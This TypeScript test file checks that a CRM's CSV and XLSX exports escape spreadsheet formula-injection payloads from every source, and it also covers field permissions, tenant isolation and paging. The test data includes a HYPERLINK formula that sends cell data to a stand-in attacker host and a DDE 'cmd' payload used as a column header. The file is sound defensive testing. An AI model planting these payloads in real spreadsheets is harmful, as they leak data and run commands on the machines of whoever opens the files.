import { FORMULA_TRIGGER_CHARACTERS, newId } from '@crm/core';
import { parse } from 'csv-parse/sync';
import ExcelJS from 'exceljs';
import { afterAll, beforeAll, describe, expect, inject, it } from 'vitest';
import { csv, startImportHarness, type WorkerHarness } from '../testing/import-harness.js';

/**
 * Export (MVP_SPEC §M8, CLAUDE.md §5.11).
 *
 * The headline property: **a spreadsheet opened from an export cannot run
 * code**. A cell that begins `=`, `+`, `-`, `@`, tab or carriage return is
 * executed as a formula by Excel and Sheets, so an exported customer name can
 * run on the machine of whoever opens the file. Every trigger character is its
 * own test, on every way a value can reach an export: a system column, a custom
 * field, a column header (an admin writes those), and data that arrived through
 * an import — which is how an attacker gets a string of their choosing into a
 * tenant in the first place.
 */
let h: WorkerHarness;
let owner: string;
let otherTenantId: string;

const unique = (): string => newId().replaceAll('-', '').slice(-10);

beforeAll(async () => {
  h = await startImportHarness(inject('dbUrls'), { name: 'Export Security' });
  owner = await h.user('Owner');
  otherTenantId = (await h.fixtures.createTenant({ name: 'Export Security B' })).tenantId;
  await h.addCustomField('contact', { key: 'notes', label: 'Notes', type: 'text' });
});

afterAll(async () => {
  await h.close();
});

/** Parse an exported CSV into records keyed by header. */
async function exportCsv(
  userId: string,
  query: Record<string, unknown> = {},
  objectType: 'contact' | 'account' | 'lead' | 'deal' = 'contact',
): Promise<{ header: string[]; rows: Record<string, string>[]; raw: string; jobId: string }> {
  const jobId = await h.requestExport({ userId, objectType, query });
  const job = await h.exportJob(jobId);
  expect(job.status, job.failureReason ?? '').toBe('completed');
  const raw = h.readText(job.storageKey);
  const records = parse(raw, { columns: false, bom: true });
  const [header = [], ...body] = records;
  return {
    header,
    rows: body.map((row) =>
      Object.fromEntries(header.map((name, index) => [name, row[index] ?? ''])),
    ),
    raw,
    jobId,
  };
}

async function seedContact(options: {
  lastName?: string;
  email?: string;
  ownerId?: string | null;
  customFields?: Record<string, unknown>;
  tenantId?: string;
}): Promise<string> {
  return h.fixtures.createContact(options.tenantId ?? h.tenantId, {
    ownerId: options.ownerId === undefined ? owner : options.ownerId,
    lastName: options.lastName ?? 'Seeded',
    email: options.email ?? `seed-${unique()}@x.io`,
    ...(options.customFields === undefined ? {} : { customFields: options.customFields }),
  });
}

describe('§5.11: formula injection, every trigger character, every source', () => {
  // Written out, not looped over FORMULA_TRIGGER_CHARACTERS: a loop would still
  // pass if a character were deleted from the list and from the test together.
  const CASES: readonly [string, string][] = [
    ['equals', '='],
    ['plus', '+'],
    ['minus', '-'],
    ['at', '@'],
    ['tab', '\t'],
    ['carriage return', '\r'],
    ['line feed', '\n'],
  ];

  it('covers exactly the characters the policy names', () => {
    expect(CASES.map(([, character]) => character).sort()).toEqual(
      [...FORMULA_TRIGGER_CHARACTERS].sort(),
    );
  });

  describe.each(CASES)('a value beginning with %s', (_name, character) => {
    // `=` after the trigger so that, for the whitespace characters, the value is
    // still a formula once an importer's `.trim()` has removed the whitespace.
    const payload = `${character}=HYPERLINK("http://evil.example/?"&A1,"x")`;

    it('is escaped when it is a system column (last name)', async () => {
      const email = `sys-${unique()}@x.io`;
      await seedContact({ lastName: payload, email });
      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
      expect(rows).toHaveLength(1);
      expect(rows[0]?.['Last name']).toBe(`'${payload}`);
    });

    it('is escaped when it is a custom field value', async () => {
      const email = `cust-${unique()}@x.io`;
      await seedContact({ email, customFields: { notes: payload } });
      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
      expect(rows[0]?.['Notes']).toBe(`'${payload}`);
    });

    it('is escaped when it arrived through an import', async () => {
      const email = `imp-${unique()}@x.io`;
      const analyzed = await h.analyze({
        userId: owner,
        bytes: csv([
          ['Last', 'Email', 'Notes'],
          [payload, email, payload],
        ]),
      });
      await h.start(analyzed.id, {
        mapping: [
          { column: 0, field: 'last_name' },
          { column: 1, field: 'email' },
          { column: 2, field: 'notes' },
        ],
      });
      await h.drain();
      expect((await h.job(analyzed.id)).createdCount).toBe(1);

      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
      expect(rows).toHaveLength(1);
      // The importer stored the string as the API's create schema would (trimmed);
      // the exporter is where it is made safe.
      const stored = payload.trim();
      const expected = /^[=+\-@\t\r\n]/.test(stored) ? `'${stored}` : stored;
      expect(expected.startsWith("'")).toBe(true);
      expect(rows[0]?.['Last name']).toBe(expected);
      expect(rows[0]?.['Notes']).toBe(expected);
    });
  });

  it('escapes a column header an admin wrote', async () => {
    await h.addCustomField('contact', {
      key: 'evil_label',
      label: "=cmd|' /c calc'!A0",
      type: 'text',
    });
    const { header } = await exportCsv(owner, { filter: [`email:eq:nobody-${unique()}@x.io`] });
    expect(header).toContain("'=cmd|' /c calc'!A0");
    expect(header.some((name) => name.startsWith('='))).toBe(false);
  });

  it('leaves no cell in the whole file that starts with a trigger character', async () => {
    const tag = unique();
    for (const [, character] of CASES) {
      await seedContact({
        lastName: `${character}last-${tag}`,
        email: `all-${tag}-${CASES.findIndex(([, c]) => c === character)}@x.io`,
        customFields: { notes: `${character}note` },
      });
    }
    const jobId = await h.requestExport({ userId: owner, objectType: 'contact' });
    const records = parse(h.readText((await h.exportJob(jobId)).storageKey), {
      columns: false,
      bom: true,
    });

    const offenders: string[] = [];
    for (const row of records) {
      for (const cell of row) {
        if (
          cell !== '' &&
          (FORMULA_TRIGGER_CHARACTERS.includes(cell.charAt(0)) || LOOKS_LIKE_FORMULA.test(cell))
        ) {
          offenders.push(cell);
        }
      }
    }
    expect(offenders).toEqual([]);
  });

  it('applies to the xlsx export too: every text cell, none starting with a trigger', async () => {
    const tag = unique();
    for (const [, character] of CASES) {
      await seedContact({
        lastName: `${character}x-${tag}`,
        email: `xl-${tag}-${CASES.findIndex(([, c]) => c === character)}@x.io`,
        customFields: { notes: `${character}n` },
      });
    }
    const jobId = await h.requestExport({
      userId: owner,
      objectType: 'contact',
      format: 'xlsx',
      query: { filter: [`email:starts_with:xl-${tag}`] },
    });
    const job = await h.exportJob(jobId);
    expect(job.status, job.failureReason ?? '').toBe('completed');

    const workbook = new ExcelJS.Workbook();
    await workbook.xlsx.load(Buffer.from(h.storage.bytesOf(job.storageKey)) as never);
    const sheet = workbook.worksheets[0]!;

    let strings = 0;
    sheet.eachRow((row) => {
      row.eachCell((cell) => {
        if (typeof cell.value === 'string' && cell.value !== '') {
          strings += 1;
          expect(FORMULA_TRIGGER_CHARACTERS.includes(cell.value.charAt(0)), cell.value).toBe(false);
          expect(LOOKS_LIKE_FORMULA.test(cell.value), cell.value).toBe(false);
        }
        // Nothing in the file is a formula object.
        expect(
          typeof cell.value === 'object' && cell.value !== null && 'formula' in cell.value,
        ).toBe(false);
      });
    });
    expect(strings).toBeGreaterThan(CASES.length * 2);
    expect(sheet.rowCount).toBe(CASES.length + 1);
  });
});

/**
 * "Does not start with a trigger" is only meaningful if it looks past leading
 * whitespace, because Excel does. Independent of the implementation's own
 * character class on purpose.
 */
const LOOKS_LIKE_FORMULA = /^[\s\u200B-\u200D\u2060\uFEFF]*[=+\-@]/u;

describe('§5.11: whitespace in front of a payload does not hide it', () => {
  const SPACES: readonly [string, string][] = [
    ['a space', ' '],
    ['a non-breaking space', '\u00A0'],
    ['an em space', '\u2003'],
    ['an ideographic space', '\u3000'],
    ['a zero-width space', '\u200B'],
    ['a byte-order mark', '\uFEFF'],
  ];

  describe.each(SPACES)('%s before an equals sign', (_name, space) => {
    const payload = `${space}=HYPERLINK("http://evil.example/?"&A1,"x")`;

    it('is escaped in a system column', async () => {
      const email = `ws-sys-${unique()}@x.io`;
      await seedContact({ lastName: payload, email });
      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
      expect(rows[0]?.['Last name']).toBe(`'${payload}`);
    });

    it('is escaped in a custom field', async () => {
      const email = `ws-cust-${unique()}@x.io`;
      await seedContact({ email, customFields: { notes: payload } });
      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
      expect(rows[0]?.['Notes']).toBe(`'${payload}`);
    });

    it('is escaped when it arrived through an import, wherever the importer left it', async () => {
      const email = `ws-imp-${unique()}@x.io`;
      const analyzed = await h.analyze({
        userId: owner,
        bytes: csv([
          ['Last', 'Email', 'Notes'],
          [payload, email, payload],
        ]),
      });
      await h.start(analyzed.id, {
        mapping: [
          { column: 0, field: 'last_name' },
          { column: 1, field: 'email' },
          { column: 2, field: 'notes' },
        ],
      });
      await h.drain();

      const { rows } = await exportCsv(owner, { filter: [`email:eq:${email}`] });
      // Some of these are trimmed by the importer (as the API's create schema
      // would trim them) and some are not; either way no stored value may leave
      // as something a spreadsheet would run.
      for (const column of ['Last name', 'Notes']) {
        const cell = rows[0]?.[column] ?? '';
        expect(cell.startsWith("'") || !LOOKS_LIKE_FORMULA.test(cell), `${column}: ${cell}`).toBe(
          true,
        );
      }
    });
  });
});

describe('metadata-driven columns (ADR-0004), field permissions (§5.4)', () => {
  it('a custom field is exported the moment it exists; a deactivated one is not', async () => {
    await h.addCustomField('contact', { key: 'fresh_field', label: 'Fresh field', type: 'text' });
    const email = `fresh-${unique()}@x.io`;
    await seedContact({ email, customFields: { fresh_field: 'hello' } });

    let result = await exportCsv(owner, { filter: [`email:eq:${email}`] });
    expect(result.rows[0]?.['Fresh field']).toBe('hello');

    await h.pool.query(
      `update field_definitions set is_active = false
       where tenant_id = $1 and object_type = 'contact' and key = 'fresh_field'`,
      [h.tenantId],
    );
    result = await exportCsv(owner, { filter: [`email:eq:${email}`] });
    expect(result.header).not.toContain('Fresh field');
    expect(result.raw).not.toContain('hello');
  });

  it('a hidden field has no column at all, not an empty one', async () => {
    const roleId = await h.fixtures.createRole(h.tenantId, `exporter-${unique()}`);
    for (const action of ['read', 'export'] as const) {
      await h.fixtures.grant(h.tenantId, roleId, 'contact', action, 'all');
    }
    await h.fixtures.setFieldPermission(h.tenantId, roleId, 'contact', 'phone', 'hidden');
    await h.fixtures.setFieldPermission(h.tenantId, roleId, 'contact', 'notes', 'hidden');
    await h.fixtures.setFieldPermission(h.tenantId, roleId, 'contact', 'title', 'read');
    const analyst = (await h.fixtures.createUser(h.tenantId, roleId)).userId;

    const email = `hidden-${unique()}@x.io`;
    const id = await seedContact({ email, customFields: { notes: 'secret-notes' } });
    await h.pool.query(
      `update contacts set phone = '+919876543210', title = 'Visible' where id = $1`,
      [id],
    );

    const { header, rows, raw } = await exportCsv(analyst, { filter: [`email:eq:${email}`] });
    expect(header).not.toContain('Phone');
    expect(header).not.toContain('Notes');
    expect(raw).not.toContain('+919876543210');
    expect(raw).not.toContain('secret-notes');
    // Read-only is readable.
    expect(rows[0]?.['Job title']).toBe('Visible');
  });

  it('a hidden field cannot be used to filter, so it cannot be probed one character at a time', async () => {
    // Rejected at the API (`assertFiltersReadable`); the worker's builder also
    // refuses a key it does not know, so a stored query naming one cannot run.
    const roleId = await h.fixtures.createRole(h.tenantId, `prober-${unique()}`);
    for (const action of ['read', 'export'] as const) {
      await h.fixtures.grant(h.tenantId, roleId, 'contact', action, 'all');
    }
    await h.fixtures.setFieldPermission(h.tenantId, roleId, 'contact', 'phone', 'hidden');
    const prober = (await h.fixtures.createUser(h.tenantId, roleId)).userId;

    const jobId = await h.requestExport({
      userId: prober,
      objectType: 'contact',
      query: { filter: ['no_such_field:eq:1'] },
    });
    const job = await h.exportJob(jobId);
    // Ends at once with a sentence, rather than retrying a query that can never run.
    expect(job.status).toBe('failed');
    expect(job.failureReason).toMatch(/no longer valid/);
    const pending = await h.pool.query(
      `select count(*)::int as n from outbox_events where record_id = $1 and status = 'pending'`,
      [jobId],
    );
    expect(pending.rows[0]?.['n']).toBe(0);
  });
});

describe('(b) record scope and permission', () => {
  it('an `own`-scope exporter gets their own rows and nothing else', async () => {
    const tag = unique();
    const roleId = await h.fixtures.createRole(h.tenantId, `own-exporter-${unique()}`);
    for (const action of ['read', 'export'] as const) {
      await h.fixtures.grant(h.tenantId, roleId, 'contact', action, 'own');
    }
    const rep = (await h.fixtures.createUser(h.tenantId, roleId)).userId;

    await seedContact({ lastName: `Mine-${tag}`, ownerId: rep, email: `m1-${tag}@x.io` });
    await seedContact({ lastName: `Mine-${tag}`, ownerId: rep, email: `m2-${tag}@x.io` });
    await seedContact({ lastName: `Theirs-${tag}`, ownerId: owner, email: `t1-${tag}@x.io` });
    await seedContact({ lastName: `Orphan-${tag}`, ownerId: null, email: `o1-${tag}@x.io` });

    const { rows, raw } = await exportCsv(rep, { filter: [`email:contains:-${tag}@`] });
    expect(rows.map((row) => row['Last name'])).toEqual([`Mine-${tag}`, `Mine-${tag}`]);
    expect(raw).not.toContain('Theirs');
    expect(raw).not.toContain('Orphan');
  });

  it('a role that may read but not export gets a failed job, not a file', async () => {
    const roleId = await h.fixtures.createRole(h.tenantId, `reader-${unique()}`);
    await h.fixtures.grant(h.tenantId, roleId, 'contact', 'read', 'all');
    const reader = (await h.fixtures.createUser(h.tenantId, roleId)).userId;

    const jobId = await h.requestExport({ userId: reader, objectType: 'contact' });
    const job = await h.exportJob(jobId);
    expect(job.status).toBe('failed');
    expect(job.failureReason).toMatch(/no longer have permission/);
    expect(h.storage.has(job.storageKey)).toBe(false);
  });

  it('permission revoked between request and run is honoured', async () => {
    const roleId = await h.fixtures.createRole(h.tenantId, `revoked-${unique()}`);
    for (const action of ['read', 'export'] as const) {
      await h.fixtures.grant(h.tenantId, roleId, 'contact', action, 'all');
    }
    const user = (await h.fixtures.createUser(h.tenantId, roleId)).userId;
    await h.fixtures.setMembershipStatus(h.tenantId, user, 'suspended');

    const jobId = await h.requestExport({ userId: user, objectType: 'contact' });
    expect((await h.exportJob(jobId)).status).toBe('failed');
  });

  it('(a) never includes another tenant’s rows or deleted rows', async () => {
    const tag = unique();
    await seedContact({ lastName: `Ours-${tag}`, email: `ours-${tag}@x.io` });
    await seedContact({
      lastName: `Foreign-${tag}`,
      email: `foreign-${tag}@x.io`,
      tenantId: otherTenantId,
      ownerId: null,
    });
    const gone = await seedContact({ lastName: `Deleted-${tag}`, email: `gone-${tag}@x.io` });
    await h.pool.query('update contacts set deleted_at = now() where id = $1', [gone]);

    const { rows, raw } = await exportCsv(owner, { filter: [`email:contains:-${tag}@`] });
    expect(rows.map((row) => row['Last name'])).toEqual([`Ours-${tag}`]);
    expect(raw).not.toContain('Foreign');
    expect(raw).not.toContain('Deleted');
  });
});

describe('filters, sort, search and paging', () => {
  it('honours the list’s filter, sort and search', async () => {
    const tag = unique();
    for (const [last, title] of [
      ['Charlie', 'CEO'],
      ['Alpha', 'CTO'],
      ['Bravo', 'CEO'],
    ] as const) {
      const id = await seedContact({ lastName: `${last}-${tag}`, email: `${last}-${tag}@x.io` });
      await h.pool.query('update contacts set title = $2 where id = $1', [id, title]);
    }

    const filtered = await exportCsv(owner, {
      filter: [`email:contains:-${tag}@`, 'title:eq:CEO'],
      sort: 'last_name',
    });
    expect(filtered.rows.map((row) => row['Last name'])).toEqual([
      `Bravo-${tag}`,
      `Charlie-${tag}`,
    ]);

    const descending = await exportCsv(owner, {
      filter: [`email:contains:-${tag}@`],
      sort: '-last_name',
    });
    expect(descending.rows.map((row) => row['Last name'])).toEqual([
      `Charlie-${tag}`,
      `Bravo-${tag}`,
      `Alpha-${tag}`,
    ]);

    // Written straight into the table, so index it: a searched export is answered by the index.
    await h.indexForSearch();
    const searched = await exportCsv(owner, { q: `Alpha-${tag}` });
    expect(searched.rows.map((row) => row['Last name'])).toEqual([`Alpha-${tag}`]);
  });

  it('pages by keyset across page boundaries with no duplicates and no gaps', async () => {
    const tag = unique();
    // 2,300 rows: more than two pages of 1,000, with ties on the sort key.
    await h.pool.query(
      `insert into contacts (id, tenant_id, owner_id, last_name, email, created_at)
       select gen_random_uuid(), $1, $2, 'Page', 'pg' || g || '-' || $3 || '@x.io',
              now() - make_interval(secs => (g % 50))
       from generate_series(1, 2300) g`,
      [h.tenantId, owner, tag],
    );
    const { rows } = await exportCsv(owner, { filter: [`email:contains:-${tag}@`] });
    expect(rows).toHaveLength(2300);
    expect(new Set(rows.map((row) => row['ID'])).size).toBe(2300);

    // And in the order asked for, ties and all.
    const times = rows.map((row) => row['Created at']);
    expect([...times].sort()).toEqual(times);
  });

  it('reports the row count on the job and audits what left', async () => {
    const tag = unique();
    await seedContact({ lastName: 'Counted', email: `c1-${tag}@x.io` });
    await seedContact({ lastName: 'Counted', email: `c2-${tag}@x.io` });
    const jobId = await h.requestExport({
      userId: owner,
      objectType: 'contact',
      query: { filter: [`email:contains:-${tag}@`] },
    });
    const job = await h.exportJob(jobId);
    expect(job).toMatchObject({ status: 'completed', rowCount: 2 });
    expect(job.sizeBytes).toBeGreaterThan(0);

    const audit = await h.pool.query(
      `select changes from audit_logs
       where tenant_id = $1 and action = 'export' and record_id = $2 and actor_id = $3`,
      [h.tenantId, jobId, owner],
    );
    expect(audit.rows[0]?.['changes']).toMatchObject({
      completed: { new: true },
      rowCount: { new: 2 },
    });
  });
});

describe('the other objects', () => {
  it('exports accounts, leads and deals with their own fields, money exactly', async () => {
    const tag = unique();
    await h.fixtures.createAccount(h.tenantId, { ownerId: owner, name: `=Acme-${tag}` });
    await h.fixtures.createLead(h.tenantId, {
      ownerId: owner,
      lastName: `+Lead-${tag}`,
      email: `lead-${tag}@x.io`,
    });

    const accounts = await exportCsv(owner, { filter: [`name:contains:Acme-${tag}`] }, 'account');
    expect(accounts.rows[0]?.['Account name']).toBe(`'=Acme-${tag}`);

    const leads = await exportCsv(owner, { filter: [`email:eq:lead-${tag}@x.io`] }, 'lead');
    expect(leads.rows[0]?.['Last name']).toBe(`'+Lead-${tag}`);

    const pipelines = await h.fixtures.pipelinesFor(h.tenantId);
    const stageId = pipelines[0]!.stages[0]!.id;
    await h.fixtures.createDeal(h.tenantId, {
      ownerId: owner,
      name: `@Deal-${tag}`,
      pipelineId: pipelines[0]!.id,
      stageId,
      amountMinor: 150075n,
      currency: 'INR',
    });
    const deals = await exportCsv(owner, { filter: [`name:contains:Deal-${tag}`] }, 'deal');
    expect(deals.rows[0]?.['Deal name']).toBe(`'@Deal-${tag}`);
    expect(deals.rows[0]?.['Amount']).toBe('1500.75 INR');
  });
});
